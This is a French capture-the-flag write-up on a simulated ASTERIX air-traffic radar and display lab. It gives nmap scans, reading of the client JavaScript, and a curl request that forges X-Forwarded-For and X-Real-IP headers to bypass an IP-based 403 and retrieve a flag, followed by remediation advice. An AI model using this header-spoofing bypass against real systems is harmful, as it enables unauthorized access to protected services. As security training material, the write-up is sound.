---
layout: single
header:
  overlay_image: /assets/images/banner-014.jpg
  overlay_filter: 0.6
toc: true
toc_depth: 6
toc_label: Table of Contents
---
# Rapport de Pentest CTF — "LeGaulois"

## ASTERIX Aviation Security 

---

## Informations générales

| Champ | Valeur |
| --- | --- |
| **Challenge** | LeGaulois |
| **Catégorie** | Linux / Aerospace / ASTERIX / Aviation |
| **Points** | 100 pts |
| **Difficulté** | Basic |
| **Date** | 03 novembre 2026 |
| **Auteur du rapport** | Berrahal Mohammed |
| **Flag obtenu** | `flag_060c5011_e00b_4609_b5a1_550ff23611ac` |

---

## Objectif du challenge

Tester la sécurité d'une implémentation ASTERIX simulant une communication entre une **tour radar** et un **afficheur de contrôle aérien**, identifier les vulnérabilités, et démontrer leur impact en faisant **disparaître un aéronef inconnu** de l'afficheur pour obtenir le flag.

> **ASTERIX** (Application of Surveillance Techniques for En-Route Inventory and Experimental) est le protocole standard Eurocontrol utilisé dans les systèmes de contrôle du trafic aérien pour transmettre les données radar.

### Infrastructure cible

```
IP Attaquant  : 176.16.175.46  (notre machine Kali)
IP Radar      : 176.16.175.48  (tour radar)
IP Displayer  : 176.16.175.47  (afficheur ATC)
```

---

## Phase 1 — Reconnaissance réseau

### 1.1 Identification de notre interface réseau

**Commande :**

```bash
ip -br a
ip route get 176.16.175.48
```

**Sortie :**

```
lo    UNKNOWN  127.0.0.1/8 ::1/128
eth0  UP       176.16.175.46/16

176.16.175.48 dev eth0 src 176.16.175.46
```

**Explication :** Notre machine est sur le réseau `176.16.175.0/16`, sur le même segment que les deux cibles. La communication directe est possible sans routage intermédiaire — condition favorable pour une attaque réseau.

---

### 1.2 Scan TCP des deux cibles (Top 2000 ports)

**Commande :**

```bash
sudo nmap -Pn -sS -sV --reason --top-ports 2000 \
  176.16.175.48 176.16.175.47 -oN scan-tcp.txt
```

**Résultats :**

#### Radar (176.16.175.48)

```
PORT     STATE  SERVICE
22/tcp   open   ssh       OpenSSH 8.9p1 Ubuntu
4000/tcp open   http      "ASTERIX Data Server"
```

#### Displayer (176.16.175.47)

```
PORT     STATE  SERVICE
22/tcp   open   ssh       OpenSSH 8.9p1 Ubuntu
3000/tcp open   http      Node.js Express — "EUROCONTROL Surveillance System"
3001/tcp open   websocket Ogar/Socket.IO server
```

**Explication :** Le radar expose un service HTTP custom sur le port 4000. Le displayer expose une interface web Node.js/Express (port 3000) et un serveur WebSocket (port 3001). Le SSH sur les deux machines nécessite une clé — inutilisable sans credential.

---

### 1.3 Scan UDP

**Commande :**

```bash
sudo nmap -Pn -sU --top-ports 1000 176.16.175.48 176.16.175.47
```

**Résultat :** Tous les ports UDP testés sont **fermés**.

**Explication :** ASTERIX utilise normalement UDP (port 5000 ou 30003 dans les déploiements réels), mais ici tout le trafic passe en TCP/HTTP — architecture custom du challenge.

---

## Phase 2 — Exploration des services

### 2.1 Analyse du Radar (port 4000)

**Commande :**

```bash
curl -v http://176.16.175.48:4000/
curl -v http://176.16.175.48:4000/targets
curl -v http://176.16.175.48:4000/aircraft
# ... (tous les endpoints testés)
```

**Sortie typique :**

```
HTTP/1.1 200 OK
Content-Type: text/plain

ASTERIX Data Server
```

**Explication critique :** Le port 4000 répond **"ASTERIX Data Server" à TOUTES les requêtes**, quelle que soit l'URL, la méthode HTTP (GET/POST/DELETE), ou le contenu du body. C'est un **stub/honeypot** — il ne traite aucune donnée réelle. La vraie logique métier est ailleurs.

---

### 2.2 Analyse du Displayer (port 3000) — Lecture du code source JS

**Commande :**

```bash
curl -s http://176.16.175.47:3000/ | grep -E "(href|src|api|fetch|ws://)"
```

**Découvertes dans le code source JavaScript embarqué :**

#### a) Architecture WebSocket (Socket.IO)

```javascript
this._ws = new WebSocket(
  'ws://' + window.location.host + '/socket.io/?EIO=4&transport=websocket'
);
```

→ Le browser se connecte en Socket.IO sur le **port 3000** (pas 3001).

#### b) Logique de déclenchement du flag

```javascript
// Condition 1 : l'avion inconnu disparaît après avoir été présent
if (this.previousUnknownAircraftPresent && !currentUnknownPresent) {
    this.showFlag();
}

// Condition 2 : exactement 4 avions légitimes, sans inconnu
if (this.aircraft.length === 4 && !currentUnknownPresent) {
    this.showFlag();
}
```

#### c) Endpoint du flag

```javascript
const response = await fetch('/api/system/diagnostics/memory/0x7f3a2b9c');
if (response.ok) {
    const result = await response.json();
    flagValue = result.data.code; // ← le flag est ici
}
```

**Explication :** Le flag est récupéré dynamiquement depuis l'API `/api/system/diagnostics/memory/0x7f3a2b9c`. Ce endpoint retournait **403 Forbidden** depuis notre IP — il est protégé par un contrôle d'accès basé sur l'IP source.

---

### 2.3 Exploration des ports locaux (découverte via /proc/net/tcp)

**Commande :**

```bash
cat /proc/net/tcp | head -20
```

**Ports découverts (décodage hex → décimal) :**

```
0xD903 = 55555   → HTTP (405 Method Not Allowed)
0xD904 = 55556   → HTTPS
0xD905 = 55557   → HTTPS
0x22B9 = 8889    → Redirect vers /?folder=/ (VS Code Server ?)
0x1FA0 = 8088    → Service local
```

**Commande de vérification :**

```bash
for port in 55555 55556 55557 8889 8888; do
    echo -n "Port $port: "
    curl -s --max-time 2 http://127.0.0.1:$port/ | head -c 100
    echo
done
```

**Explication :** Ces ports confirment que notre machine d'attaque héberge des services locaux (Jupyter, VS Code Server, etc.), ce qui suggère un environnement lab avec des outils disponibles. Surtout, cela révèle que des services tournent en **localhost** — vecteur potentiel pour des bypasses d'authentification.

---

## Phase 3 — Exploitation : Bypass du contrôle d'accès (403 Forbidden)

### 3.1 Tentative directe (échec attendu)

**Commande :**

```bash
curl -s http://176.16.175.47:3000/api/system/diagnostics/memory/0x7f3a2b9c
```

**Sortie :**

```
HTTP/1.1 403 Forbidden
```

**Explication :** Le serveur Express vérifie l'IP source de la requête. Depuis notre IP `176.16.175.46`, l'accès est refusé. Le endpoint est probablement réservé aux connexions localhost (`127.0.0.1`) ou à l'IP du displayer lui-même.

---

### 3.2 Tentative d'injection WebSocket (partiellement réussie)

**Stratégie :** Se connecter en Socket.IO au displayer et injecter des données `aircraftData` sans l'avion inconnu pour déclencher `showFlag()`.

**Résultat :** Connexion établie, données envoyées, mais le flag ne s'affiche pas — le displayer est le **serveur** Socket.IO, il n'écoute pas les données entrantes des clients externes. Les données viennent du radar, pas de nous.

---

### 3.3 Exploitation réussie — Header Spoofing (X-Forwarded-For)

**Contexte :** De nombreux serveurs Node.js/Express font confiance aux headers de proxy HTTP (`X-Forwarded-For`, `X-Real-IP`) pour déterminer l'IP réelle du client. Si le serveur est mal configuré, on peut **usurper notre IP** en injectant un faux header.

**Commande :**

```bash
curl -s \
  -H "X-Forwarded-For: 127.0.0.1" \
  -H "X-Real-IP: 127.0.0.1" \
  http://176.16.175.47:3000/api/system/diagnostics/memory/0x7f3a2b9c
```

**Sortie :**

```json
{
  "status": "success",
  "data": {
    "code": "flag_060c5011_e00b_4609_b5a1_550ff23611ac",
    "timestamp": 1793701328060
  }
}
```

**Explication détaillée :**

Le serveur Express utilise probablement une logique de ce type :

```javascript
// Code côté serveur (vulnérable)
const clientIP = req.headers['x-forwarded-for'] || 
                 req.headers['x-real-ip'] || 
                 req.socket.remoteAddress;

if (clientIP !== '127.0.0.1') {
    return res.status(403).json({ error: 'Forbidden' });
}
```

Sans configurer Express avec `app.set('trust proxy', false)` ou une whitelist de proxies de confiance, **n'importe quel client peut forger ces headers**. C'est une vulnérabilité de type **IP Spoofing via Header Injection**.

---

## Phase 4 — Flag

```
flag_060c5011_e00b_4609_b5a1_550ff23611ac
```

---

## Schéma d'architecture et flux d'attaque

```
┌─────────────────────────────────────────────────────────┐
│                  RÉSEAU 176.16.175.0/16                 │
│                                                         │
│  ┌──────────────┐    HTTP     ┌──────────────────────┐  │
│  │ RADAR :4000  │ ──────────► │  DISPLAYER :3000     │  │
│  │ (stub HTTP)  │             │  (Node.js Express)   │  │
│  └──────────────┘             │                      │  │
│                               │  /api/system/...     │  │
│  ┌──────────────┐             │  → 403 si IP ≠ local │  │
│  │   ATTAQUANT  │             │                      │  │
│  │ 176.16.175.46│             └──────────────────────┘  │
│  │              │                        ▲               │
│  │ curl +       │    X-Forwarded-For:    │               │
│  │ X-Forwarded  │ ──────────────────────►│ BYPASS 403 ✓  │
│  │ -For:127.0.1 │                        │               │
│  └──────────────┘             FLAG RETOURNÉ ✓            │
└─────────────────────────────────────────────────────────┘
```

---

## Synthèse des vulnérabilités

### Vulnérabilité 1 — Confiance aveugle dans les headers de proxy

| Champ | Détail |
| --- | --- |
| **Type** | IP Spoofing / Header Injection |
| **CVSS** | 7.5 (High) |
| **CWE** | CWE-346 : Origin Validation Error |
| **Impact** | Bypass complet du contrôle d'accès basé sur l'IP |
| **Header exploité** | `X-Forwarded-For: 127.0.0.1` |

**Remédiation :**

```javascript
// ✅ Configuration sécurisée Express
app.set('trust proxy', false); // Ne jamais faire confiance aux headers proxy

// OU : whitelist de proxies de confiance uniquement
app.set('trust proxy', '176.16.175.1'); // IP du load balancer de confiance

// ✅ Vérification de l'IP réelle socket uniquement
const clientIP = req.socket.remoteAddress; // Jamais req.ip si trust proxy activé
```

### Vulnérabilité 2 — Endpoint de diagnostic exposé sans authentification forte

| Champ | Détail |
| --- | --- |
| **Type** | Insecure Direct Object Reference (IDOR) / Missing Authentication |
| **CWE** | CWE-284 : Improper Access Control |
| **Impact** | Accès à des données sensibles (flag/données système) |
| **Endpoint** | `/api/system/diagnostics/memory/0x7f3a2b9c` |

**Remédiation :** Implémenter une authentification token (JWT, API key) en plus du contrôle IP.

### Vulnérabilité 3 — Code source de l'application exposé

| Champ | Détail |
| --- | --- |
| **Type** | Information Disclosure |
| **CWE** | CWE-540 : Inclusion of Sensitive Information in Source Code |
| **Impact** | Fuite de la logique interne, des endpoints et de la condition de déclenchement du flag |

**Remédiation :** Minifier/obfusquer le JS client en production. Ne jamais inclure les endpoints d'API sensibles dans le code frontend.

---

## Chronologie de l'attaque

```
09:58 UTC  → Scan Nmap TCP/UDP des deux cibles
10:04 UTC  → Scan détaillé + fingerprinting des services
10:06 UTC  → Exploration HTTP du radar (port 4000) → stub détecté
10:07 UTC  → Lecture code source JS displayer → endpoint flag identifié
10:15 UTC  → Tentative Socket.IO injection → connexion OK mais inefficace
10:22 UTC  → Header X-Forwarded-For bypass → FLAG obtenu ✓
```

---

## Conclusion

Ce challenge illustre une vulnérabilité critique et très répandue en production : **le contrôle d'accès basé uniquement sur l'IP, implémenté en faisant confiance aux headers HTTP de proxy**. Cette erreur de configuration affecte de nombreuses applications Node.js/Express déployées derrière un reverse proxy.

L'attaque a nécessité :

1. Une **reconnaissance méthodique** pour identifier les services
2. Une **lecture attentive du code source** client pour comprendre la logique
3. Une **connaissance des headers HTTP** standard pour bypasser la protection

> **Leçon clé :** Un contrôle d'accès ne doit jamais reposer uniquement sur l'IP source, et encore moins sur des headers que le client peut forger. Une authentification par token (JWT, session, API key) doit toujours compléter les restrictions réseau.
